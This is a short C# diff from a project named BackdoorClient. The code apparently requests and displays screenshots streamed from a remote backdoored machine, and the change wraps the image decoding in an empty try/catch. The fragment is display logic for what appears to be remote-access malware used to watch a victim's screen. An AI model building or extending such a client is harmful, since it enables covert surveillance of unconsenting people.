@@ -35,13 +35,20 @@ namespace BackdoorClient
 
                 pictrBytes = mainForm.SendCommandAndGetBytesResponce("transl $get", 1000000);
                 Bitmap bmp;
-                using (var ms = new MemoryStream(pictrBytes))
+                try
                 {
-                    bmp = new Bitmap(ms);
+                    using (var ms = new MemoryStream(pictrBytes))
+                    {
+                        bmp = new Bitmap(ms);
+                    }
+
+
+                    translScreen.Image = bmp;
                 }
+                catch
+                {
 
-
-                translScreen.Image = bmp;
+                }
                 translScreen.Update();
                 await Task.Run(() => System.Threading.Thread.Sleep(100));
             }
